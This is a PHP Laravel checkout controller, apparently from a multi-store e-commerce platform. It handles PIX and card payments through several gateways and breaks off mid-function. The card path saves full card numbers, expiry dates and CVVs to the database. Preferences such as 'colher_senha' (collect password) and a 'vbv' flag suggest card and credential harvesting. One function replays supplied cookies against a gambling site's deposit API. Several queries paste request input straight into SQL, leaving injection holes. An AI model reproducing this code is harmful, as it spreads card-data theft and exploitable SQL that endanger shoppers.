<?php

namespace App\Http\Controllers;

use chillerlan\QRCode\QRCode;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use PHPShopify\ShopifySDK;

class CheckoutController extends Controller
{
    public function getCheckoutByHash(Request $request)
    {
        $helper = new Helper();
        $hash = $request->hash;

        if (!$helper->verificaParametro($hash)) {
            return response()->json(['status' => 500]);
        }

        $query = DB::table('carrinho as c')
            ->join('loja as l', 'c.id_loja', '=', 'l.id_loja')
            ->select([
                'c.id_carrinho AS order_id', 'c.hash', 'l.id_loja',
                'l.nm_loja', 'l.cd_tipo_checkout', 'l.cnpj_loja', 'l.email_loja',
                'l.img_loja', 'l.cor_loja', 'l.frete_padrao', 'l.alert_text',
            ])
            ->where('c.hash', $hash)
            ->first();

        if (empty($query)) {
            return response()->json(['status' => 500]);
        }

        $query->products = DB::table('order_product AS op')
            ->join('produto as p', 'p.id_produto', '=', 'op.product_id')
            ->where('op.order_id', $query->order_id)
            ->selectRaw('p.titulo, COALESCE(op.unit_price, p.preco, 0) as preco, p.imagem1, op.quantity AS quantidade, op.variant AS variacao')
            ->get();

        $query->pixelfb = DB::table('pixel_facebook')
                ->where('id_loja', $query->id_loja)
                ->select([
                    'pixel_1', 'pixel_2', 'pixel_3', 'pixel_4',
                    'pixel_5', 'pixel_6'
                ])
                ->first() ?? [];

        $query->pixeltaboola = DB::table('pixel_taboola')
            ->where('id_loja', $query->id_loja)
            ->value('id_taboola');

        $preferences = DB::table('checkout_preferencias')
            ->where('id_loja', $query->id_loja)
            ->select('resumo_aberto', 'ultimo_dia', 'colher_senha', 'redirect_status', 'redirect_link')
            ->first();

        $query->resumo_aberto = optional($preferences)->resumo_aberto == 's';
        $query->ultimo_dia = optional($preferences)->ultimo_dia == 's';
        $query->colher_senha = optional($preferences)->colher_senha == 's';
        $query->redirect_link = (optional($preferences)->redirect_status && optional($preferences)->redirect_link) ? $preferences->redirect_link : null;

        $queryCartao = DB::table('cartao_loja')
            ->where('id_loja', $query->id_loja)
            ->first();

        $query->cc = !empty($queryCartao);
        $query->vbv = $query->cc && $queryCartao->vbv == 's';
        $query->mensagem_erro = $query->cc ? $queryCartao->mensagem_erro : false;

        $queryLogo = DB::table('pagamento_pix')
            ->where('id_loja', $query->id_loja)
            ->select(['logo_banco', 'instalment_rate'])
            ->first();

        $query->logo = $this->getLogoBanco(optional($queryLogo)->logo_banco ?? 'mp');
        $query->instalment_rate = optional($queryLogo)->instalment_rate ?? 0;

        $query->card_id = DB::table('cartao')
            ->where('id_loja', $query->id_loja)
            ->orderBy('id', 'DESC')
            ->value('id');

        if ($request->filled('step')) {
            DB::table('carrinho')
                ->where('hash', $hash)
                ->update([
                    'step' => $request->step
                ]);
        }

        return response()->json($query);
    }

    public function getFretes(Request $request)
    {
        $helper = new Helper();

        if (!$helper->verificaParametro($request->hash)) {
            return response()->json(['status' => 500]);
        }

        try {
            $idLoja = DB::select(DB::raw("
             SELECT id_loja
             FROM carrinho
             WHERE hash = :hash
            "), [
                'hash' => $request->hash
            ]);

            if (empty($idLoja)) return false;

            $fretes = DB::select(DB::raw("
                SELECT *
                FROM frete_loja
                WHERE id_loja = :id_loja
            "), [
                'id_loja' => $idLoja[0]->id_loja
            ]);

            if (empty($fretes)) return ['status' => 200, 'listaFretes' => []];

            return response()->json([
                'status' => 200,
                'listaFretes' => $fretes
            ]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);

        }
    }

    public function getMetodosPagamento(Request $request)
    {
        try {
            $helper = new Helper();

            if (!$helper->verificaParametro($request->hash)) {
                return response()->json(['status' => 500]);
            }

            $cart = DB::table('carrinho')
                ->where('hash', $request->hash)
                ->selectRaw("
                    id_carrinho, nome_completo, cpf, telefone, cep, rua, numero, id_loja, bairro,
                    complemento, frete_selecionado, frete_selecionado_valor, email, orderbump,
                    IFNULL(vl_orderbump, 0) as vl_orderbump
                ")
                ->first();

            if (!$cart) return response()->json(['status' => 500]);

            $this->shopifyOrderStore($request->hash);

            $pagamentoPix = DB::table('pagamento_pix')
                ->where('id_loja', $cart->id_loja)
                ->select('tipo_chave', 'chave', 'logo_banco')
                ->get();

            $generalBumpProducts = DB::table('produto')
                ->where('id_loja', $cart->id_loja)
                ->whereNotNull('order_bump_general_price')
                ->select('id_produto AS id', 'titulo AS title', 'imagem1 AS image', 'preco AS actual_price', 'order_bump_general_price AS offer_price')
                ->get();

            $dependentBumpProducts = DB::table('produto AS mp') // mp = main product, bp = bump product
                ->join('produto AS bp', 'bp.id_produto', '=', 'mp.produto_orderbump')
                ->where('mp.id_loja', $cart->id_loja)
                ->where('bp.id_loja', $cart->id_loja)
                ->whereIn(
                    'mp.id_produto',
                    DB::table('order_product')
                        ->where('order_id', $cart->id_carrinho)
                        ->pluck('product_id')
                )
                ->select('bp.id_produto AS id', 'bp.titulo AS title', 'bp.imagem1 AS image', 'bp.preco AS actual_price', 'mp.valor_orderbump AS offer_price')
                ->get();

            return response()->json([
                'status' => 200,
                'listaCliente' => $cart,
                'listaTiposPagamento' => ['pix' => $pagamentoPix],
                'bumpProducts' => $generalBumpProducts->merge($dependentBumpProducts)->keyBy('id')->values()
            ]);
        } catch (\Exception $exception) {
            return response()->json(['status' => 500]);
        }
    }

    private function getLogoBanco($obj)
    {
        try {
            $l = [
                'mp' => [
                    'img' => 'mp',
                    'texto' => 'Mercado Pago'
                ],
                'pag' => [
                    'img' => 'pag',
                    'texto' => 'PagSeguro'
                ],
                'brazaPay' => [
                    'img' => 'brazapay',
                    'texto' => 'BrazaPay'
                ],
                'inter' => [
                    'img' => 'inter',
                    'texto' => 'Inter'
                ],
                'bradesco' => [
                    'img' => 'bradesco',
                    'texto' => 'Bradesco'
                ],
                'nubank' => [
                    'img' => 'nubank',
                    'texto' => 'Nubank'
                ],
                'santander' => [
                    'img' => 'santander',
                    'texto' => 'Santander'
                ],
                'suitpay' => [
                    'img' => 'suitpay',
                    'texto' => 'Suitpay'
                ],
                'neon' => [
                    'img' => 'neon',
                    'texto' => 'Neon'
                ],
                'stone' => [
                    'img' => 'stone',
                    'texto' => 'Stone'
                ]
            ];

            if (is_null($obj->logo_banco)) {
                return [
                    'img' => 'mp',
                    'texto' => 'Mercado Pago'
                ];
            }

            return $l[$obj->logo_banco];
        } catch (\Exception $e) {
            return [
                'img' => 'mp',
                'texto' => 'Mercado Pago'
            ];
        }
    }

    public function getPagamento(Request $request)
    {
        try {
            $helper = new Helper();

            if (!$helper->verificaParametro($request->hash)) {
                return response()->json(['status' => 500]);
            }

            $shop = DB::table('carrinho')
                ->select('id_loja', 'metodo_pagamento')
                ->where('hash', $request->hash)
                ->first();

            if (empty($shop)) {
                return response()->json(['status' => 404]);
            }

            $getValorCarrinho = DB::table('carrinho')
                ->select('frete_selecionado_valor', 'vl_orderbump', 'orderbump')
                ->where('hash', $request->hash)
                ->first();

            if (in_array($shop->metodo_pagamento, ['cartao', 'pix'])) {
                $gateway = DB::table('pagamento_pix')
                    ->where('id_loja', $shop->id_loja)
                    ->whereIn('logo_banco', ['pagShield', 'brazaPay', 'horsePay', 'marchaPay'])
                    ->orderBy('id', 'DESC')
                    ->value('logo_banco');

                // Primeira tentativa com credenciais principais
                if ($gateway === 'brazaPay') {
                    $response = (new BrazaPayController())->createTransaction(
                        $request->hash, $request->postbackUrl, $shop->metodo_pagamento
                    );
                } elseif ($gateway === 'horsePay') {
                    // HorsePay não suporta pagamento por cartão; quando método for 'cartao', retornar erro padrão
                    if ($shop->metodo_pagamento === 'cartao') {
                        return response()->json([
                            'status' => 404,
                            'message' => 'Houve um Erro',
                            'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                        ]);
                    }
                    $response = (new HorsePayController())->createTransaction(
                        $request->hash,
                        url('/api/horsepay/callback'),
                        $shop->metodo_pagamento
                    );
                } elseif ($gateway === 'marchaPay') {
                    // MarchaPay: fluxo apenas PIX
                    if ($shop->metodo_pagamento === 'cartao') {
                        return response()->json([
                            'status' => 404,
                            'message' => 'Houve um Erro',
                            'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                        ]);
                    }
                    $response = (new MarchaPayController())->createTransaction(
                        $request->hash,
                        url('/api/marchapay/callback'),
                        $shop->metodo_pagamento
                    );
                } else {
                    $response = (new PagShieldController())->createTransaction(
                        $request->hash, $request->postbackUrl, $shop->metodo_pagamento
                    );
                }

                // Avaliar sucesso de PIX pela presença do código, não apenas pelo status HTTP
                $usedReserve = false;
                $pixCodeEarly = null;
                if ($shop->metodo_pagamento === 'pix') {
                    if (($gateway ?? null) === 'brazaPay') {
                        $pixCodeEarly = $response['pix_code'] ?? ($response['pix']['qrCode'] ?? $response['pix']['qrcode'] ?? null);
                    } elseif (($gateway ?? null) === 'horsePay') {
                        $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['copy_past'] ?? null);
                    } elseif (($gateway ?? null) === 'marchaPay') {
                        $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                    } else {
                        $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                    }

                    // Se não veio código PIX, tentar com credenciais de reserva
                    if (empty($pixCodeEarly)) {
                        $reserveGateway = DB::table('pagamento_reserva')
                            ->where('id_loja', $shop->id_loja)
                            ->orderBy('id', 'DESC')
                            ->value('logo_banco');

                        if ($reserveGateway) {
                            $reserveNorm = strtolower(trim($reserveGateway));
                            if ($reserveNorm === 'brazapay') {
                                $response = (new BrazaPayController())->createTransaction(
                                    $request->hash, $request->postbackUrl, $shop->metodo_pagamento, true
                                );
                            } elseif ($reserveNorm === 'horsepay') {
                                if ($shop->metodo_pagamento === 'cartao') {
                                    return response()->json([
                                        'status' => 404,
                                        'message' => 'Houve um Erro',
                                        'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                                    ]);
                                }
                                $response = (new HorsePayController())->createTransaction(
                                    $request->hash,
                                    url('/api/horsepay/callback'),
                                    $shop->metodo_pagamento,
                                    true
                                );
                            } elseif ($reserveNorm === 'marchapay') {
                                if ($shop->metodo_pagamento === 'cartao') {
                                    return response()->json([
                                        'status' => 404,
                                        'message' => 'Houve um Erro',
                                        'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                                    ]);
                                }
                                $response = (new MarchaPayController())->createTransaction(
                                    $request->hash,
                                    url('/api/marchapay/callback'),
                                    $shop->metodo_pagamento,
                                    true
                                );
                            } else {
                                $response = (new PagShieldController())->createTransaction(
                                    $request->hash, $request->postbackUrl, $shop->metodo_pagamento, true
                                );
                            }
                            // Atualiza o gateway e recalcula o código PIX
                            $gateway = $reserveGateway;
                            $usedReserve = true;

                            $gatewayNorm = strtolower(trim($gateway ?? ''));
                            if ($gatewayNorm === 'brazapay') {
                                $pixCodeEarly = $response['pix_code'] ?? ($response['pix']['qrCode'] ?? $response['pix']['qrcode'] ?? null);
                            } elseif ($gatewayNorm === 'horsepay') {
                                $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['copy_past'] ?? null);
                            } elseif ($gatewayNorm === 'marchapay') {
                                $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                            } else {
                                $pixCodeEarly = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                            }
                        }
                    }
                }

                // Se não é cartão e já temos código PIX, não barrar por status != 200
                if (($response['status'] ?? '') != 200 && !($shop->metodo_pagamento === 'pix' && !empty($pixCodeEarly))) {
                    $response['custom_error_message'] = $this->getErrorMessage($shop->id_loja);
                    return response()->json($response);
                }

                DB::table('transactions')->insert([
                    'hash' => $request->hash,
                    'data' => json_encode($response),
                    'status' => ucfirst($response['status']),
                    'created_at' => now(),
                    'updated_at' => now(),
                ]);

                DB::table('carrinho')
                    ->where('hash', $request->hash)
                    ->update([
                        'gateway_status' => ucfirst($response['status']),
                        'finalizou_pedido' => 's',
                        'data_pedido' => now(),
                    ]);

                DB::table('order_product as op')
                    ->join('produto as p', 'p.id_produto', '=', 'op.product_id')
                    ->where(
                        'op.order_id',
                        DB::table('carrinho')->where('hash', $request->hash)->value('id_carrinho')
                    )
                    ->whereNull('op.unit_price')
                    ->update(['op.unit_price' => DB::raw('p.preco')]);

                if ($response['paymentMethod'] === 'credit_card') {
                    (new UtmifyController())->createOrder(
                        $request->hash, $response['status'], 'credit_card', $response['paidAt']
                    );

                    $this->shopifyOrderUpdate($request->hash);

                    return $this->xxx(
                        $request, $shop, $getValorCarrinho,
                        $response['secureUrl'], $response['status'],
                        $response['id'], 'card'
                    );
                } elseif ($response['paymentMethod'] === 'pix') {
                    (new UtmifyController())->createOrder(
                        $request->hash, $response['status'], 'pix'
                    );

                    // Reutiliza o cálculo inicial, quando disponível
                    $pixCode = $pixCodeEarly ?? null;
                    if (($gateway ?? null) === 'brazaPay') {
                        // BrazaPay responses commonly use 'pix_code'
                        $pixCode = $pixCode ?? ($response['pix']['qrCode'] ?? $response['pix']['qrcode'] ?? null);
                    } elseif (($gateway ?? null) === 'horsePay') {
                        $pixCode = $pixCode ?? ($response['pix']['qrcode'] ?? ($response['copy_past'] ?? null));
                    } else {
                        $pixCode = $pixCode ?? ($response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null));
                    }

                    // Se não veio código PIX, tentar novamente com credenciais de reserva (caso ainda não tenha tentado)
                    if (empty($pixCode)) {
                        if (!$usedReserve) {
                            $reserveGateway = DB::table('pagamento_reserva')
                                ->where('id_loja', $shop->id_loja)
                                ->orderBy('id', 'DESC')
                                ->value('logo_banco');

                            if ($reserveGateway) {
                                $reserveNorm = strtolower(trim($reserveGateway));
                                if ($reserveNorm === 'brazapay') {
                                    $response = (new BrazaPayController())->createTransaction(
                                        $request->hash, $request->postbackUrl, $shop->metodo_pagamento, true
                                    );
                                } elseif ($reserveNorm === 'horsepay') {
                                    if ($shop->metodo_pagamento === 'cartao') {
                                        return response()->json([
                                            'status' => 404,
                                            'message' => 'Houve um Erro',
                                            'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                                        ]);
                                    }
                                    $response = (new HorsePayController())->createTransaction(
                                        $request->hash,
                                        url('/api/horsepay/callback'),
                                        $shop->metodo_pagamento,
                                        true
                                    );
                                } elseif ($reserveNorm === 'marchapay') {
                                    if ($shop->metodo_pagamento === 'cartao') {
                                        return response()->json([
                                            'status' => 404,
                                            'message' => 'Houve um Erro',
                                            'custom_error_message' => $this->getErrorMessage($shop->id_loja),
                                        ]);
                                    }
                                    $response = (new MarchaPayController())->createTransaction(
                                        $request->hash,
                                        url('/api/marchapay/callback'),
                                        $shop->metodo_pagamento,
                                        true
                                    );
                                } else {
                                    $response = (new PagShieldController())->createTransaction(
                                        $request->hash, $request->postbackUrl, $shop->metodo_pagamento, true
                                    );
                                }
                                $gateway = $reserveGateway;
                                $usedReserve = true;

                                // recalcular pixCode após fallback
                                $gatewayNorm = strtolower(trim($gateway ?? ''));
                                if ($gatewayNorm === 'brazapay') {
                                    $pixCode = $response['pix_code'] ?? ($response['pix']['qrCode'] ?? $response['pix']['qrcode'] ?? null);
                                } elseif ($gatewayNorm === 'horsepay') {
                                    $pixCode = $response['pix']['qrcode'] ?? ($response['copy_past'] ?? null);
                                } elseif ($gatewayNorm === 'marchapay') {
                                    $pixCode = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                                } else {
                                    $pixCode = $response['pix']['qrcode'] ?? ($response['pix']['qrCode'] ?? null);
                                }
                            }
                        }

                        if (empty($pixCode)) {
                            return response()->json([
                                'status' => 404,
                                'message' => 'PIX code not available from gateway response'
                            ]);
                        }
                    }

                    $result = $this->xxx(
                        $request, $shop, $getValorCarrinho,
                        $pixCode, $response['status'],
                        $response['id'] ?? null, 'pix'
                    );

                    // Adiciona URL de checagem de transação quando HorsePay
                    if (($gateway ?? null) === 'horsePay') {
                        $apiBase = url('/api/');
                        $json = $result->getData(true);
                        $json['transactionCheckUrl'] = $apiBase . 'horsepay/transaction/' . ($response['id'] ?? '');
                        return response()->json($json);
                    }

                    return $result;
                } else {
                    return response()->json([
                        'status' => 500,
                        'message' => 'Payment method must be card or pix'
                    ]);
                }
            } else {
                return response()->json([
                    'status' => 500,
                    'message' => 'Payment method must be card or pix'
                ]);
            }
        } catch (\Exception $exception) {
            return response()->json([
                'status' => 500,
                'in' => 'CC',
                'message' => $exception->getMessage()
            ]);
        }
    }

    private function xxx($request, $shop, $getValorCarrinho, $secureUrl, $paymentStatus, $transactionId, $paymentMethod)
    {
        $helper = new Helper();
        $whatsapp = new WhatsappController;
        $email = new EmailController;
        $qrcode = new Qrcode();

        $verificaZap = $helper->query("SELECT instance_id, instance_token FROM whatsapp_loja WHERE id_loja = " . $shop->id_loja);
        $verificaEnviado = $helper->query("SELECT whatsapp_pedido, email_pedido FROM carrinho WHERE hash = '" . $request->hash . "'");
        $verificaSmtp = $helper->query("SELECT id, opcao_selecionada FROM smtp_loja WHERE id_loja = " . $shop->id_loja);

        // if (!empty($verificaZap) && $verificaEnviado[0]->whatsapp_pedido == 'n') {
        //     $notificacao = $whatsapp->enviaMensagem($request->hash, 'pedido', $secureUrl);
        //     if ($notificacao) {
        //         $whatsapp->atualizaStatus($request->hash, 'whatsapp_pedido');
        //     }
        // }

        if ($verificaEnviado[0]->email_pedido == 'n' && !empty($verificaSmtp)) {
            $email->emailConfirmacao($shop->id_loja, $request->hash, $secureUrl);
        }

        return response()->json([
            'status' => 200,
            'qrcode' => $qrcode->render($secureUrl),
            'brcode' => $secureUrl,
            'secureUrl' => $secureUrl,
            'frete_selecionado_valor' => $getValorCarrinho->frete_selecionado_valor,
            'orderbump' => $getValorCarrinho->orderbump,
            'vl_orderbump' => $getValorCarrinho->vl_orderbump,
            'payment_method' => $paymentMethod,
            'payment_status' => $paymentStatus,
            'transactionId' => $transactionId,
            'custom_error_message' => $this->getErrorMessage($shop->id_loja),
        ]);
    }

    public function postback($hash, Request $request)
    {
        $data = $request->data;

        DB::table('transactions')
            ->where('hash', $hash)
            ->update([
                'data' => json_encode($data),
                'status' => ucfirst($data['status']),
                'updated_at' => date('Y-m-d H:i:s'),
            ]);

        (new UtmifyController())->createOrder($hash, $data['status'], 'pix', $data['paidAt']);

        return response()->json(['status' => 200]);
    }

    private function getCredenciais($idloja)
    {
        try {
            $q = DB::select(DB::raw("
                SELECT *
                FROM shopify_loja
                WHERE id_loja = " . $idloja . "
            "));

            return [
                'ShopUrl' => $q[0]->dominio_loja,
                'ApiKey' => $q[0]->chave_api,
                'Password' => $q[0]->token_api,
                'Curl' => array(
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_FOLLOWLOCATION => true
                )
            ];
        } catch (\Exception $e) {
            return false;
        }
    }

    private function shopifyOrderStore($hash)
    {
        try {
            $cart = DB::table('carrinho')
                ->where('hash', $hash)
                ->whereNull('shopify_order_id')
                ->first();

            if (!$cart) return false;

            if (
                DB::table('shopify_loja')
                    ->where('id_loja', $cart->id_loja)
                    ->where('marcar_pedido', 's')
                    ->doesntExist()
            ) return false;

            $products = DB::table('order_product AS op')
                ->leftJoin('produto AS p', 'p.id_produto', '=', 'op.product_id')
                ->where('op.order_id', $cart->id_carrinho)
                ->selectRaw('p.titulo AS title, COALESCE(op.unit_price, p.preco, 0) AS price, op.quantity, p.id_shopify AS product_id, p.id_variante_shopify AS variant_id')
                ->get()
                ->toArray();

            $config = $this->getCredenciais($cart->id_loja);
            $shopify = new ShopifySDK($config);

            $nome = explode(' ', $cart->nome_completo);
            $nome2 = "";
            $sobrenome = "";
            foreach ($nome as $k => $v) {
                if ($k == 0) $nome2 = $v;
                else $sobrenome .= $v;

            }

            $request = file_get_contents("https://viacep.com.br/ws/" . $cart->cep . "/json/");
            $request = json_decode($request, true);

            $address = [
                'first_name' => $nome2,
                'last_name' => $sobrenome,
                'address1' => $cart->rua . ', Nr ' . $cart->numero . ' - ' . $cart->bairro,
                'city' => $request['localidade'],
                'province' => $request['uf'],
                'zip' => $cart->cep,
                'country' => 'BR',
                'phone' => '+55' . str_replace(' ', '', str_replace(')', '', str_replace('(', '', str_replace('-', '', $cart->telefone)))),
                'cpf' => $cart->cpf,
            ];

            $orderData = [
                'line_items' => $products,
                'email' => $cart->email,
                'customer' => [
                    'first_name' => $nome2,
                    'last_name' => $sobrenome,
                    'phone' => '+55' . str_replace(' ', '', str_replace(')', '', str_replace('(', '', str_replace('-', '', $cart->telefone)))),
                    'cpf' => $cart->cpf
                ],
                'shipping_address' => $address,
                'billing_address' => $address,
                'note' => 'No note',
                'financial_status' => 'pending',
                'send_receipt' => true,
            ];

            $order = $shopify->Order->post($orderData);

            DB::select(DB::raw("UPDATE carrinho SET pedido_shopify = 's', shopify_order_id = '{$order['id']}' WHERE hash = '" . $cart->hash . "'"));

            return true;
        } catch (\Exception $exception) {
            return false;
        }
    }

    public function shopifyOrderUpdate($hash)
    {
        try {
            $cart = DB::table('carrinho')
                ->where('hash', $hash)
                ->whereNotNull('shopify_order_id')
                ->first();

            if (!$cart) return false;

            $config = $this->getCredenciais($cart->id_loja);
            $shopify = new ShopifySDK($config);

            $shopify->Order($cart->shopify_order_id)->put([
                'fulfillment_status' => 'fulfilled'
            ]);

            return true;
        } catch (\Exception $exception) {
            return false;
        }
    }

    public function pixCopiado(Request $request)
    {
        try {
            $helper = new Helper();
            if (!$helper->verificaParametro($request->hash)) return response()->json(['status' => 500]);

            $helper->query("
                UPDATE carrinho
                SET sn_pix_copiado = 's'
                WHERE hash = :hash
            ", ['hash' => $request->hash]);

            return response()->json(['status' => 200]);

        } catch (\Exception $e) {
            return response()->json(['status' => 500]);

        }
    }

    public function ativaOrderBump(Request $request)
    {
        $price = DB::table('order_product AS op')
            ->join('produto AS p', 'p.id_produto', '=', 'op.product_id')
            ->where('op.order_id', $request->orderId)
            ->where('p.produto_orderbump', $request->bumpProductId)
            ->value('p.valor_orderbump');

        DB::table('order_product')
            ->insert([
                'order_id' => $request->orderId,
                'product_id' => $request->bumpProductId,
                'quantity' => 1,
                'unit_price' => $price,
                'created_at' => now(),
                'updated_at' => now(),
            ]);

        $bumpProduct = DB::table('produto')
            ->where('id_produto', $request->bumpProductId)
            ->select('titulo', 'imagem1', 'id_produto')
            ->first();

        return response()->json([
            'status' => 200,
            'titulo' => $bumpProduct->titulo,
            'img' => $bumpProduct->imagem1,
            'preco' => $price,
            'id' => $bumpProduct->id_produto,
        ]);
    }

    public function desativarOrder(Request $request)
    {
        DB::table('order_product')
            ->where('order_id', $request->orderId)
            ->where('product_id', $request->bumpProductId)
            ->delete();

        return response()->json(['status' => 200]);
    }

    public function getQrCodeBc($cookie, $smid, $valor)
    {
        try {
            $url = 'https://bc.game/api/payment/deposit/fiat/create/';

            $headers = [
                'Authority' => 'bc.game',
                'Method' => 'POST',
                'Path' => '/api/payment/deposit/fiat/create/',
                'Scheme' => 'https',
                'Accept' => 'application/json, text/plain, */*',
                'Accept-Language' => 'pt',
                'Content-Type' => 'application/json',
                'Cookie' => $cookie,
                'Origin' => 'https://bc.game',
                'Referer' => 'https://bc.game/pt',
                'Smid' => $smid,
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            ];

            $payload = [
                'currencyName' => 'BRLFIAT',
                'method' => 'Pagsmile',
                'wayName' => 'FIAT',
                'channel' => 'Pagsmile_BRL_PIX',
                'amount' => $valor,
                'kycItem' => (object)[
                    'name' => '',
                    'number' => ''
                ],
            ];

            $l = [
                0 => [
                    'method' => 'Pagsmile',
                    'channel' => 'Pagsmile_BRL_PIX'
                ],
                1 => [
                    'method' => 'BetCat-PIX',
                    'channel' => 'BetCatPay'
                ],
                2 => [
                    'method' => 'TopPay',
                    'channel' => 'TopPay'
                ]
            ];

            $_codigo = null;
            $l2 = [];
            foreach ($l as $k => $v) {
                try {
                    $response = Http::withHeaders($headers)->withOptions(['stream' => true])->post($url, $payload);
                    $body = $response;
                    $body = json_decode($body, true);

                    $l2[] = $body;

                    if ($body['code'] == 6002) {

                    }

                    if ($body['code'] == 0) {
                        $_codigo = $body['data']['data']['qrCode'];
                        break;
                    }
                } catch (\Exception $e) {
                    return $e;
                }
            }
            return $l2;
            if (is_null($_codigo)) return true;

            return $_codigo;

        } catch (\Exception $e) {
            return $e;
        }
    }

    public function pagamentoCartao(Request $request)
    {
        try {

            $whatsapp = new WhatsappController;
            $email = new EmailController;

            $verificaPago = DB::select(DB::raw("
                SELECT status_pagamento
                FROM transacao_cartao
                WHERE hash = '" . $request->hash . "' AND status_pagamento = 'paid'
            "));

            if (!empty($verificaPago)) return response()->json(['status' => 300, 'mensagem' => 'Pedido já pago.']);

            $carrinho = DB::select(DB::raw("
                SELECT c.*,
                       l.id_usuario_pai,
                       p.*
                FROM carrinho c
                LEFT JOIN loja l ON c.id_loja = l.id_loja
                LEFT JOIN produto p ON c.id_produto = p.id_produto
                WHERE c.hash = '" . $request->hash . "'
            "));

            $suitPay = DB::select(DB::raw("
                SELECT ci, cs, usuario_suitpay
                FROM suitpay_loja
                WHERE id_loja = " . $carrinho[0]->id_loja . "
            "));

            $reqIbge = Http::get('https://viacep.com.br/ws/' . $carrinho[0]->cep . '/json/');
            $reqIbge = json_decode($reqIbge, true);


            $reqParcela = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->get('https://ws.suitpay.app/api/v1/gateway/fee-simulator-gateway?value=' . ($carrinho[0]->preco * $carrinho[0]->quantidade) + $carrinho[0]->vl_orderbump);

            $reqParcela = json_decode($reqParcela, true);

            $amount = ($request->parcela == '1' ? $reqParcela['list'][0]['valueCredito'] : $reqParcela['list'][0]['value' . $request->parcela . 'x']);

            $nome = explode(' ', $carrinho[0]->nome_completo);
            $n = "";
            $s = "";
            $i = 0;
            foreach ($nome as $k => $v) {
                if ($i == 0) $n .= $v;
                else $s .= " " . $v;
            }

            $validade = explode('/', $request->validade);

            $req = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->post('https://ws.suitpay.app/api/v1/gateway/' . ($request->valida3ds ? 'validate' : 'card'), [
                'requestNumber' => $request->hash,
                'amount' => $amount,
                'shippingAmount' => $carrinho[0]->frete_selecionado_valor,
                'clientIp' => $request->ip,
                'usernameCheckout' => $suitPay[0]->usuario_suitpay,
                'client' => [
                    'name' => $n . ' ' . $s,
                    'document' => $carrinho[0]->cpf,
                    'phoneNumber' => str_replace(')', '', str_replace('(', '', str_replace(' ', '', str_replace('-', '', $carrinho[0]->telefone)))),
                    'email' => $carrinho[0]->email,
                    'address' => [
                        'codIbge' => $reqIbge['ibge'],
                        'street' => $carrinho[0]->rua,
                        'number' => (!is_null($carrinho[0]->numero) ? $carrinho[0]->numero : 0),
                        'zipCode' => $carrinho[0]->cep,
                        'neighborhood' => $carrinho[0]->bairro,
                        'city' => $reqIbge['localidade'],
                        'state' => $reqIbge['uf']
                    ]
                ],
                'card' => [
                    'number' => $request->cartao,
                    'expirationMonth' => $validade[0],
                    'expirationYear' => $validade[1],
                    'cvv' => $request->cvv,
                    'installment' => $request->parcela,
                    'amount' => $amount,
                ],
                'products' => [
                    [
                        'description' => $carrinho[0]->titulo,
                        'quantity' => $carrinho[0]->quantidade,
                        'value' => $carrinho[0]->preco
                    ]
                ],
                'deviceInfo' => [
                    'httpAcceptBrowserValue' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'httpAcceptContent' => 'application/pdf, text/pdf',
                    'httpBrowserColorDepth' => '24',
                    'httpBrowserJavaEnabled' => 'N',
                    'httpBrowserJavaScriptEnabled' => 'Y',
                    'httpBrowserLanguage' => 'pt-BR	',
                    'httpBrowserScreenHeight' => '864',
                    'httpBrowserScreenWidth' => '1536',
                    'httpBrowserTimeDifference' => '180',
                    'userAgentBrowserValue' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'
                ],
                'code3DS' => $request->ds,
                'urlSite3DS' => $request->url,
                'validateToken' => ($request->valida3ds ? $request->jwt : null)
            ]);

            $req = json_decode($req, true);

            $helper = new Helper();

            $verificaZap = $helper->query("SELECT instance_id, instance_token FROM whatsapp_loja WHERE id_loja = " . $carrinho[0]->id_loja);
            $verificaEnviado = $helper->query("SELECT whatsapp_pedido, email_pedido FROM carrinho WHERE hash = '" . $request->hash . "'");
            $verificaSmtp = $helper->query("SELECT id, opcao_selecionada FROM smtp_loja WHERE id_loja = " . $carrinho[0]->id_loja);

            if ($req['statusTransaction'] == 'PAYMENT_ACCEPT') {
                $helper->query('UPDATE carrinho SET finalizou_pedido = "s", data_pedido = :dt WHERE hash = :hash', ['hash' => $request->hash, 'dt' => date('Y-m-d H:i:s')]);
                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'paid',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                    UPDATE carrinho
                    SET status_pagamento = 'paid', metodo_pagamento = 'card'
                    WHERE hash = '" . $request->hash . "'
                    "));

                if ($verificaEnviado[0]->email_pedido == 'n' && !empty($verificaSmtp)) {
                    $email->emailConfirmacao($carrinho[0]->id_loja, $request->hash, 'PIX_CODIGO', true);
                }


                return response()->json(['status' => 200]);
            }

            if ($req['response'] == 'OK' && $req['statusTransaction'] == 'WAITING_FOR_APPROVAL') {

